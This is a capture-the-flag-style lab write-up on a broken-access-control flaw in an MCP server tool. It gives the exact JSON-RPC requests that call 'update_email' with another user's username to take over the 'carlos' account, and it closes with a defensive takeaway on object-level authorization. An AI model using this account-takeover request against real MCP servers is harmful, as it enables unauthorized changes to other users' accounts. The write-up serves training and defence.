# Broken Access Control in an MCP Server Tool

## Lab

**Name:** Broken access control in an MCP server tool
**Goal:** Use an MCP tool to change the email address of `carlos`.

## Authentication

Log in as `wiener` and copy the API key shown on `/my-account`.

Use the API key as a bearer token:

```http
Authorization: Bearer <Wiener API key>
Content-Type: application/json
```

## Identify the Vulnerable Tool

Initialize the MCP server and list its tools:

```json
{"jsonrpc":"2.0","id":2,"method":"tools/list","params":{}}
```

The `update_email` tool accepts an optional `username` argument:

```json
{
  "username": "wiener",
  "email": "attacker@example.com"
}
```

## Exploit

Call `update_email` with `carlos` as the target username:

```json
{
  "jsonrpc":"2.0",
  "id":3,
  "method":"tools/call",
  "params": {
    "name": "update_email",
    "arguments": {
      "username": "carlos",
      "email": "attacker@example.com"
    }
  }
}
```

A successful response is:

```text
Email updated for carlos
```

## Why It Works

The tool does not verify that the authenticated API-key owner is allowed to modify the requested account. The `username` argument makes it possible to act on another user's account.

## Key Takeaway

Authorization checks must be applied at the tool and account-object level. Authentication alone does not prove that a user may modify a target account.
